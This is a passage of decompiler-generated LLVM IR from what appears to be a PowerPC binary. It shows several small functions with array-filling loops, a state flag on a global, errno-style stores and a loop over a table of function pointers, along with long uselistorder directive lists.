325, 326, 327, 328, 329, 330, 331, 332, 12, 333, 334, 335, 336, 337, 338, 339 }
  uselistorder label %dec_label_pc_1000db40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000dae4, { 1, 0 }
}

define i32 @function_1000db58(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000db8c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_1000db70 = call i32 @function_1000cf4c()
  %v2_1000db78 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000db78, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000db9033 = add i32 %v2_1000db78, 124
  %v4_1000db9034 = inttoptr i32 %v3_1000db9033 to i32*
  store i32 0, i32* %v4_1000db9034, align 4
  %v0_1000db9435 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000db9436 = add i32 %v0_1000db9435, -1
  store i32 %v1_1000db9436, i32* %r9.global-to-local, align 4
  %v0_1000db9837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000db9838 = add i32 %v0_1000db9837, -1
  store i32 %v1_1000db9838, i32* %ctr.global-to-local, align 4
  %v2_1000db9839 = icmp eq i32 %v1_1000db9838, 0
  br i1 %v2_1000db9839, label %dec_label_pc_1000db9c, label %dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge

dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge: ; preds = %dec_label_pc_1000db8c.lr.ph, %dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge
  %v1_1000db9440 = phi i32 [ %v1_1000db94, %dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge ], [ %v1_1000db9436, %dec_label_pc_1000db8c.lr.ph ]
  %v0_1000db90.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000db90.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1000db8c = mul i32 %v1_1000db9440, 4
  %v3_1000db90 = add i32 %v1_1000db8c, %v1_1000db90.pre
  %v4_1000db90 = inttoptr i32 %v3_1000db90 to i32*
  store i32 %v0_1000db90.pre, i32* %v4_1000db90, align 4
  %v0_1000db94 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000db94 = add i32 %v0_1000db94, -1
  store i32 %v1_1000db94, i32* %r9.global-to-local, align 4
  %v0_1000db98 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000db98 = add i32 %v0_1000db98, -1
  store i32 %v1_1000db98, i32* %ctr.global-to-local, align 4
  %v2_1000db98 = icmp eq i32 %v1_1000db98, 0
  br i1 %v2_1000db98, label %dec_label_pc_1000db9c, label %dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge

dec_label_pc_1000db9c:                            ; preds = %dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge, %dec_label_pc_1000db8c.lr.ph
  store i32 %v2_1000db78, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_1000dba4 = call i32 @function_1000c3a0()
  %v3_1000dba8 = icmp eq i32 %v0_1000dba4, 0
  br i1 %v3_1000dba8, label %dec_label_pc_1000dbb0, label %dec_label_pc_1000dbc0

dec_label_pc_1000dbb0:                            ; preds = %dec_label_pc_1000db9c
  store i32 268491712, i32* @lr, align 4
  %v3_1000dbbc = call i32 @function_1000b748(i32 1, i32 %v2_1000db78, i32 0)
  br label %dec_label_pc_1000dbc0

dec_label_pc_1000dbc0:                            ; preds = %dec_label_pc_1000db9c, %dec_label_pc_1000dbb0
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000dbc4 = load i32, i32* @global_var_1001eb70.527, align 4
  %v3_1000dbc8 = icmp eq i32 %v3_1000dbc4, 0
  br i1 %v3_1000dbc8, label %dec_label_pc_1000dbd0, label %dec_label_pc_1000dbf8

dec_label_pc_1000dbd0:                            ; preds = %dec_label_pc_1000dbc0
  store i32 1, i32* @global_var_1001eb70.527, align 4
  br label %dec_label_pc_1000dbd8

dec_label_pc_1000dbd8:                            ; preds = %dec_label_pc_1000dc54, %dec_label_pc_1000dbd0
  store i32 ptrtoint (i32* @global_var_1001ead8.525 to i32), i32* %r29.global-to-local, align 4
  %v0_1000dbe4 = call i32 @function_1000cf4c()
  store i32 268491760, i32* @lr, align 4
  %v1_1000dbec = call i32 @function_1000c1f0(i32 6)
  %v0_1000dbf4 = call i32 @function_1000cf4c()
  %v3_1000dbfc.pre = load i32, i32* @global_var_1001eb70.527, align 4
  br label %dec_label_pc_1000dbf8

dec_label_pc_1000dbf8:                            ; preds = %dec_label_pc_1000dbc0, %dec_label_pc_1000dbd8
  %v0_1000dc70 = phi i32 [ %v3_1000dbc4, %dec_label_pc_1000dbc0 ], [ %v3_1000dbfc.pre, %dec_label_pc_1000dbd8 ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000dc00 = icmp eq i32 %v0_1000dc70, 1
  br i1 %v3_1000dc00, label %dec_label_pc_1000dc40.lr.ph, label %dec_label_pc_1000dc70

dec_label_pc_1000dc40.lr.ph:                      ; preds = %dec_label_pc_1000dbf8
  %v2_1000dc0c = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1001eb70.527, align 4
  store i32 ptrtoint (i32* @global_var_1000dc20.529 to i32), i32* @lr, align 4
  %v3_1000dc1c = call i32 @function_1000bc90(i32 %v2_1000dc0c, i32 0, i32 140)
  store i32 %v2_1000db78, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_1000db9033, i32* %r9.global-to-local, align 4
  %v2_1000dc4825 = add i32 %v2_1000db78, 256
  %v3_1000dc4826 = inttoptr i32 %v2_1000dc4825 to i32*
  store i32 -1, i32* %v3_1000dc4826, align 4
  %v0_1000dc4c27 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dc4c28 = add i32 %v0_1000dc4c27, -1
  store i32 %v1_1000dc4c28, i32* %r11.global-to-local, align 4
  %v0_1000dc5029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dc5030 = add i32 %v0_1000dc5029, -1
  store i32 %v1_1000dc5030, i32* %ctr.global-to-local, align 4
  %v2_1000dc5031 = icmp eq i32 %v1_1000dc5030, 0
  br i1 %v2_1000dc5031, label %dec_label_pc_1000dc54, label %dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge

dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge: ; preds = %dec_label_pc_1000dc40.lr.ph, %dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge
  %v1_1000dc4c32 = phi i32 [ %v1_1000dc4c, %dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge ], [ %v1_1000dc4c28, %dec_label_pc_1000dc40.lr.ph ]
  %v1_1000dc44.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000dc48.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000dc40 = mul i32 %v1_1000dc4c32, 4
  %v2_1000dc44 = add i32 %v1_1000dc40, %v1_1000dc44.pre
  store i32 %v2_1000dc44, i32* %r9.global-to-local, align 4
  %v2_1000dc48 = add i32 %v2_1000dc44, 132
  %v3_1000dc48 = inttoptr i32 %v2_1000dc48 to i32*
  store i32 %v0_1000dc48.pre, i32* %v3_1000dc48, align 4
  %v0_1000dc4c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000dc4c = add i32 %v0_1000dc4c, -1
  store i32 %v1_1000dc4c, i32* %r11.global-to-local, align 4
  %v0_1000dc50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dc50 = add i32 %v0_1000dc50, -1
  store i32 %v1_1000dc50, i32* %ctr.global-to-local, align 4
  %v2_1000dc50 = icmp eq i32 %v1_1000dc50, 0
  br i1 %v2_1000dc50, label %dec_label_pc_1000dc54, label %dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge

dec_label_pc_1000dc54:                            ; preds = %dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge, %dec_label_pc_1000dc40.lr.ph
  store i32 268491884, i32* @lr, align 4
  %v4_1000dc68 = call i32 @function_1000da94(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000dbd8

dec_label_pc_1000dc70:                            ; preds = %dec_label_pc_1000dbf8
  %v3_1000dc70 = icmp eq i32 %v0_1000dc70, 2
  br i1 %v3_1000dc70, label %dec_label_pc_1000dc78, label %dec_label_pc_1000dc84

dec_label_pc_1000dc78:                            ; preds = %dec_label_pc_1000dc70
  store i32 3, i32* @global_var_1001eb70.527, align 4
  br label %dec_label_pc_1000dc84

dec_label_pc_1000dc84:                            ; preds = %dec_label_pc_1000dc70, %dec_label_pc_1000dc78
  %v3_1000dc84 = phi i32 [ %v0_1000dc70, %dec_label_pc_1000dc70 ], [ 3, %dec_label_pc_1000dc78 ]
  %v1_1000dc8c = icmp ne i32 %v3_1000dc84, 3
  call void @__pseudo_cond_branch(i1 %v1_1000dc8c, i32 268491936)
  store i32 4, i32* @global_var_1001eb70.527, align 4
  %v1_1000dc9c = call i32 @function_1000d2ec(i32 127)
  ret i32 %v1_1000dc9c

; uselistorder directives
  uselistorder i32 %v1_1000dc50, { 1, 0 }
  uselistorder i32 %v1_1000dc4c, { 1, 0 }
  uselistorder i32 %v1_1000db98, { 1, 0 }
  uselistorder i32 %v1_1000db94, { 1, 0 }
  uselistorder i32 %v2_1000db78, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 2, 5, 6, 8, 7, 3, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 1, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 (i32)* @function_1000d2ec, { 1, 0 }
  uselistorder i32 127, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 3, { 0, 6, 34, 93, 94, 106, 107, 56, 118, 117, 8, 123, 124, 125, 108, 109, 119, 120, 121, 122, 1, 7, 35, 36, 57, 95, 96, 97, 2, 98, 100, 101, 9, 37, 38, 10, 39, 40, 102, 103, 11, 41, 104, 12, 105, 99, 64, 42, 3, 89, 67, 68, 69, 43, 58, 59, 61, 62, 60, 63, 44, 45, 13, 65, 4, 66, 70, 15, 46, 5, 14, 71, 17, 72, 47, 16, 73, 74, 75, 18, 48, 19, 76, 77, 78, 20, 49, 21, 79, 80, 23, 50, 22, 81, 82, 51, 83, 24, 25, 26, 84, 85, 52, 86, 27, 28, 29, 87, 88, 30, 53, 31, 90, 91, 32, 54, 33, 92, 110, 111, 112, 114, 113, 115, 55, 116 }
  uselistorder i32 (i32, i32*, i32)* @function_1000da94, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 3, 0 }
  uselistorder i32 256, { 85, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 95, 96, 97, 13, 87, 14, 99, 15, 16, 17, 18, 19, 100, 20, 90, 101, 91, 102, 98, 21, 22, 23, 0, 93, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 94, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 88, 56, 57, 58, 59, 60, 61, 62, 63, 89, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 86, 103, 104, 105, 84, 92 }
  uselistorder i32 (i32, i32, i32)* @function_1000bc90, { 1, 9, 10, 0, 3, 5, 4, 8, 7, 6, 2 }
  uselistorder i32 2, { 242, 41, 0, 1, 67, 68, 243, 69, 244, 70, 245, 29, 2, 3, 4, 42, 133, 145, 246, 134, 30, 71, 43, 72, 32, 31, 33, 73, 74, 130, 75, 76, 131, 132, 77, 230, 44, 5, 6, 231, 232, 39, 233, 78, 45, 46, 79, 47, 236, 80, 144, 8, 7, 82, 81, 83, 34, 220, 147, 87, 135, 86, 136, 85, 137, 84, 48, 138, 9, 10, 11, 139, 88, 89, 90, 91, 140, 141, 142, 28, 143, 92, 93, 95, 94, 96, 50, 49, 97, 98, 99, 100, 35, 40, 146, 234, 12, 36, 235, 13, 148, 149, 150, 151, 152, 153, 154, 101, 155, 156, 51, 157, 158, 159, 160, 161, 103, 162, 102, 163, 164, 165, 166, 167, 168, 169, 170, 104, 171, 52, 105, 106, 172, 173, 107, 108, 174, 175, 176, 109, 110, 177, 178, 111, 112, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 14, 15, 16, 17, 18, 19, 113, 189, 53, 190, 191, 192, 193, 194, 20, 21, 22, 23, 24, 25, 114, 195, 54, 196, 197, 198, 199, 200, 201, 115, 202, 116, 203, 55, 204, 205, 206, 207, 208, 209, 117, 210, 118, 211, 56, 212, 213, 214, 216, 217, 218, 215, 119, 219, 57, 221, 222, 223, 120, 121, 225, 226, 227, 224, 122, 228, 58, 229, 37, 237, 124, 59, 238, 60, 61, 125, 62, 38, 63, 126, 64, 127, 65, 128, 66, 129, 239, 26, 27, 240, 123, 241 }
  uselistorder i32* @global_var_1001eb70.527, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 268566528, { 39, 40, 0, 41, 2, 1, 3, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 4, 20, 5, 21, 22, 23, 37 }
  uselistorder i32 (i32, i32, i32)* @function_1000b748, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 ()* @function_1000c3a0, { 2, 1, 0, 4, 3 }
  uselistorder i32* @r4, { 88, 89, 90, 69, 70, 32, 1, 33, 7, 34, 98, 96, 5, 4, 91, 93, 94, 72, 92, 9, 6, 71, 10, 11, 12, 8, 97, 35, 36, 95, 13, 14, 15, 79, 76, 77, 78, 73, 74, 75, 24, 25, 26, 3, 63, 64, 65, 66, 38, 16, 17, 18, 19, 20, 21, 22, 23, 27, 28, 29, 30, 31, 37, 0, 2, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 67, 68, 80, 81, 82, 83, 84, 85, 86, 87 }
  uselistorder i32 6, { 14, 15, 74, 2, 16, 17, 41, 18, 71, 3, 0, 42, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 4, 28, 29, 30, 31, 32, 33, 43, 34, 44, 45, 46, 5, 47, 48, 49, 6, 50, 51, 52, 53, 7, 8, 9, 54, 55, 56, 35, 10, 57, 58, 36, 11, 59, 37, 60, 38, 61, 62, 63, 64, 39, 12, 65, 66, 67, 68, 69, 40, 13, 70, 72, 73 }
  uselistorder i32 4, { 157, 0, 1, 429, 430, 208, 209, 184, 185, 210, 211, 212, 438, 445, 2, 3, 4, 5, 6, 391, 393, 392, 389, 390, 350, 351, 352, 353, 394, 395, 396, 397, 378, 379, 380, 398, 399, 7, 187, 8, 86, 188, 189, 439, 440, 441, 158, 442, 443, 444, 9, 400, 159, 10, 431, 432, 433, 73, 74, 434, 435, 160, 436, 437, 11, 213, 214, 215, 216, 217, 161, 162, 186, 163, 354, 355, 356, 93, 85, 357, 358, 359, 87, 12, 361, 362, 363, 364, 360, 365, 76, 366, 75, 164, 88, 89, 90, 165, 91, 373, 374, 92, 375, 376, 377, 372, 367, 368, 369, 370, 371, 200, 13, 201, 14, 202, 203, 204, 77, 166, 205, 311, 218, 190, 167, 191, 95, 94, 96, 192, 193, 194, 195, 78, 196, 79, 197, 198, 199, 15, 82, 168, 169, 170, 16, 206, 207, 97, 83, 219, 220, 221, 17, 222, 223, 224, 225, 103, 226, 227, 18, 19, 102, 101, 228, 229, 20, 98, 100, 99, 230, 231, 21, 232, 233, 109, 234, 22, 23, 235, 108, 107, 236, 104, 237, 106, 105, 238, 239, 240, 116, 24, 25, 241, 242, 26, 243, 244, 245, 115, 27, 28, 111, 110, 246, 112, 114, 113, 247, 248, 249, 250, 251, 252, 171, 118, 117, 253, 254, 255, 256, 257, 258, 172, 120, 119, 259, 260, 29, 261, 262, 263, 121, 264, 265, 30, 31, 123, 122, 266, 124, 126, 125, 267, 268, 32, 269, 270, 132, 271, 272, 33, 34, 131, 130, 273, 127, 129, 128, 274, 275, 276, 277, 35, 278, 279, 280, 281, 173, 282, 36, 283, 284, 37, 285, 135, 134, 286, 133, 174, 287, 288, 289, 290, 38, 291, 292, 293, 294, 175, 295, 39, 296, 297, 40, 298, 138, 137, 299, 136, 176, 300, 301, 302, 303, 41, 305, 306, 177, 307, 308, 309, 144, 310, 42, 43, 178, 304, 143, 142, 139, 141, 140, 312, 313, 314, 315, 316, 179, 180, 44, 318, 319, 181, 320, 321, 322, 150, 323, 45, 46, 182, 317, 149, 148, 145, 147, 146, 47, 324, 325, 48, 49, 326, 327, 50, 51, 328, 329, 52, 53, 330, 331, 54, 55, 332, 333, 56, 57, 334, 335, 58, 336, 59, 337, 338, 60, 61, 339, 340, 62, 63, 341, 342, 64, 65, 343, 344, 66, 67, 345, 346, 68, 69, 347, 348, 70, 401, 349, 381, 382, 383, 384, 385, 386, 84, 387, 71, 388, 402, 403, 404, 405, 406, 407, 151, 408, 409, 410, 411, 412, 413, 152, 414, 415, 416, 153, 154, 417, 418, 155, 419, 420, 156, 421, 422, 423, 80, 424, 81, 72, 425, 426, 427, 428, 183 }
  uselistorder i32 32, { 24, 25, 58, 49, 50, 39, 40, 20, 21, 47, 48, 41, 0, 1, 2, 22, 61, 23, 62, 26, 27, 42, 3, 28, 4, 5, 6, 29, 59, 30, 60, 45, 7, 8, 9, 31, 46, 10, 11, 12, 13, 14, 32, 33, 43, 44, 51, 52, 53, 54, 55, 56, 57, 63, 64, 65, 66, 67, 15, 16, 34, 68, 35, 69, 36, 70, 17, 18, 19, 71, 72, 37, 38 }
  uselistorder i32 31, { 1, 2, 13, 36, 37, 3, 4, 0, 5, 40, 41, 30, 31, 38, 39, 14, 15, 32, 33, 34, 35, 22, 23, 26, 27, 28, 29, 11, 12, 16, 17, 18, 10, 24, 25, 6, 19, 7, 20, 8, 21, 9 }
  uselistorder i32 ()* @function_1000cf4c, { 3, 2, 1, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 21, 20, 19 }
  uselistorder label %dec_label_pc_1000dc84, { 1, 0 }
  uselistorder label %dec_label_pc_1000dc40.dec_label_pc_1000dc40_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000dbf8, { 1, 0 }
  uselistorder label %dec_label_pc_1000dbc0, { 1, 0 }
  uselistorder label %dec_label_pc_1000db8c.dec_label_pc_1000db8c_crit_edge, { 1, 0 }
}

define i32 @function_1000dca8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000dca8:
  %v1_1000dca8 = add i32 %arg1, 28
  %v2_1000dca8 = inttoptr i32 %v1_1000dca8 to i32*
  %v3_1000dca8 = load i32, i32* %v2_1000dca8, align 4
  store i32 %v3_1000dca8, i32* @global_var_1001eb74.530, align 4
  %v1_1000dcb8 = add i32 %arg1, 44
  %v2_1000dcb8 = inttoptr i32 %v1_1000dcb8 to i32*
  %v3_1000dcb8 = load i32, i32* %v2_1000dcb8, align 4
  store i32 %v3_1000dcb8, i32* @global_var_1001eb78.531, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 17, 5, 10, 11, 6, 7, 8, 9, 2, 12, 3, 13, 14, 15, 0, 1, 4, 16 }
  uselistorder i32 28, { 46, 8, 9, 2, 3, 10, 7, 36, 37, 39, 40, 41, 42, 38, 5, 6, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 32, 33, 34, 1, 35, 43, 44, 45 }
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_1000dcc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000dcc4:
  store i32 %arg1, i32* @global_var_1001eb7c.524, align 4
  %v0_1000dcec = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000dcec)
  %v1_1000dcf4 = call i32 @function_1000dd40(i32 12)
  ret i32 %v1_1000dcf4

; uselistorder directives
  uselistorder i32 12, { 20, 49, 50, 36, 37, 51, 52, 53, 54, 122, 123, 124, 125, 6, 106, 126, 0, 1, 9, 107, 5, 21, 22, 10, 45, 55, 56, 23, 57, 58, 59, 24, 25, 38, 26, 27, 39, 28, 29, 40, 30, 31, 41, 12, 11, 42, 14, 13, 43, 44, 108, 109, 110, 111, 112, 113, 114, 115, 117, 118, 121, 120, 116, 8, 46, 47, 48, 7, 32, 33, 34, 35, 119, 60, 15, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 16, 73, 74, 75, 76, 77, 78, 79, 17, 80, 81, 82, 83, 84, 85, 86, 87, 88, 18, 89, 90, 91, 92, 93, 94, 95, 96, 97, 19, 98, 99, 100, 101, 102, 103, 104, 105, 2, 3, 4, 127, 128, 129 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 10, 0, 3, 12, 11, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i1 true, { 2, 0, 1 }
  uselistorder i32* @global_var_1001eb7c.524, { 1, 0, 2 }
}

define i32 @function_1000dcf8() local_unnamed_addr {
dec_label_pc_1000dcf8:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000dd10 = call i32 @__asm_mfcr()
  %v1_1000dd14 = and i32 %v0_1000dd10, 268435456
  %v3_1000dd14 = icmp eq i32 %v1_1000dd14, 0
  store i32 %v0_1000dd10, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dd14, label %dec_label_pc_1000dd2c, label %dec_label_pc_1000dd20

dec_label_pc_1000dd20:                            ; preds = %dec_label_pc_1000dcf8
  %v0_1000dd20 = call i32 @function_1000bb0c()
  %v0_1000dd24 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000dd24 = inttoptr i32 %v0_1000dd20 to i32*
  store i32 %v0_1000dd24, i32* %v2_1000dd24, align 4
  br label %dec_label_pc_1000dd2c

dec_label_pc_1000dd2c:                            ; preds = %dec_label_pc_1000dcf8, %dec_label_pc_1000dd20
  %v0_1000dd3c = phi i32 [ %v0_1000dd10, %dec_label_pc_1000dcf8 ], [ -1, %dec_label_pc_1000dd20 ]
  ret i32 %v0_1000dd3c

; uselistorder directives
  uselistorder i32 268435456, { 42, 36, 45, 31, 46, 47, 48, 49, 32, 33, 50, 51, 25, 30, 39, 52, 26, 40, 34, 35, 27, 53, 43, 37, 44, 38, 41, 28, 54, 55, 29, 2, 0, 1, 5, 3, 4, 8, 6, 7, 9, 10, 13, 11, 12, 16, 14, 15, 17, 20, 18, 19, 23, 21, 22, 24 }
  uselistorder i32 ()* @__asm_mfcr, { 14, 22, 11, 42, 10, 9, 8, 7, 41, 40, 6, 5, 4, 49, 43, 18, 3, 48, 17, 39, 38, 47, 2, 13, 20, 12, 19, 16, 46, 1, 0, 45, 44, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 21, 15 }
  uselistorder label %dec_label_pc_1000dd2c, { 1, 0 }
}

define i32 @function_1000dd40(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000dd40:
  store i32 %arg1, i32* @r29, align 4
  %v0_1000dd54 = call i32 @function_1000bb0c()
  %v0_1000dd58 = load i32, i32* @r29, align 4
  %v2_1000dd58 = inttoptr i32 %v0_1000dd54 to i32*
  store i32 %v0_1000dd58, i32* %v2_1000dd58, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 ()* @function_1000bb0c, { 25, 17, 31, 14, 49, 13, 12, 11, 10, 48, 47, 46, 9, 8, 3, 7, 6, 52, 51, 23, 24, 40, 39, 38, 37, 45, 44, 43, 36, 50, 20, 5, 4, 35, 19, 42, 41, 34, 2, 16, 27, 15, 26, 18, 33, 1, 0, 32, 30, 29, 55, 54, 53, 28, 22, 21 }
  uselistorder i32* @r29, { 332, 333, 345, 14, 15, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 346, 347, 348, 349, 350, 1, 40, 334, 335, 336, 337, 268, 269, 319, 2, 320, 321, 338, 339, 340, 341, 343, 344, 16, 17, 18, 61, 62, 63, 64, 65, 66, 67, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 304, 305, 306, 307, 308, 298, 299, 300, 301, 302, 303, 3, 31, 32, 33, 4, 34, 35, 36, 19, 0, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 37, 38, 39, 41, 42, 43, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 76, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 5, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 6, 161, 7, 162, 8, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 9, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 10, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 11, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 12, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 323, 322, 324, 325, 326, 13, 327, 328, 329, 330, 331, 342 }
}

define i32 @function_1000dd74(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000dd74:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001e994.512 to i32), i32* %r31.global-to-local, align 4
  %v3_1000dd90 = load i32, i32* @global_var_1001e994.512, align 4
  %v3_1000dd94 = icmp eq i32 %v3_1000dd90, -1
  br i1 %v3_1000dd94, label %dec_label_pc_1000ddb0, label %dec_label_pc_1000dd9c

dec_label_pc_1000dd9c:                            ; preds = %dec_label_pc_1000dd74, %dec_label_pc_1000dd9c
  %v0_1000dd9c = phi i32 [ %v3_1000dda4, %dec_label_pc_1000dd9c ], [ %v3_1000dd90, %dec_label_pc_1000dd74 ]
  call void @__pseudo_call(i32 %v0_1000dd9c)
  %v0_1000dda4 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000dda4 = add i32 %v0_1000dda4, -4
  %v2_1000dda4 = inttoptr i32 %v1_1000dda4 to i32*
  %v3_1000dda4 = load i32, i32* %v2_1000dda4, align 4
  store i32 %v1_1000dda4, i32* %r31.global-to-local, align 4
  %v3_1000dda8 = icmp eq i32 %v3_1000dda4, -1
  br i1 %v3_1000dda8, label %dec_label_pc_1000ddb0, label %dec_label_pc_1000dd9c

dec_label_pc_1000ddb0:                            ; preds = %dec_label_pc_1000dd9c, %dec_label_pc_1000dd74
  %v0_1000ddc0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000ddc0

; uselistorder directives
  uselistorder i32 %v3_1000dda4, { 1, 0 }
  uselistorder i32 -4, { 0, 3, 4, 5, 6, 7, 8, 17, 18, 9, 10, 11, 12, 13, 14, 15, 16, 2, 1 }
  uselistorder void (i32)* @__pseudo_call, { 1, 4, 5, 2, 3, 0 }
  uselistorder i32 -1, { 154, 155, 0, 44, 102, 369, 16, 17, 18, 370, 103, 371, 14, 15, 45, 46, 274, 85, 47, 203, 48, 49, 50, 51, 52, 204, 205, 206, 207, 208, 209, 53, 382, 380, 54, 372, 373, 86, 104, 374, 21, 22, 105, 379, 19, 20, 191, 3, 87, 275, 276, 39, 156, 378, 375, 55, 157, 106, 158, 23, 24, 159, 160, 161, 42, 56, 162, 163, 107, 108, 109, 110, 277, 278, 25, 26, 27, 111, 279, 280, 112, 113, 114, 28, 115, 88, 84, 210, 211, 57, 58, 59, 60, 376, 377, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 381, 75, 164, 116, 29, 281, 282, 117, 118, 1, 119, 120, 254, 76, 77, 121, 2, 122, 30, 123, 78, 124, 31, 283, 89, 255, 125, 90, 256, 257, 258, 126, 259, 260, 79, 261, 127, 33, 128, 32, 129, 264, 265, 266, 130, 80, 267, 268, 269, 131, 132, 262, 263, 180, 83, 4, 181, 182, 133, 34, 183, 184, 185, 186, 187, 134, 43, 217, 93, 165, 166, 91, 167, 168, 169, 92, 170, 171, 172, 94, 173, 174, 175, 81, 176, 177, 135, 35, 136, 36, 178, 5, 6, 7, 8, 9, 179, 188, 82, 189, 190, 137, 138, 139, 140, 141, 192, 193, 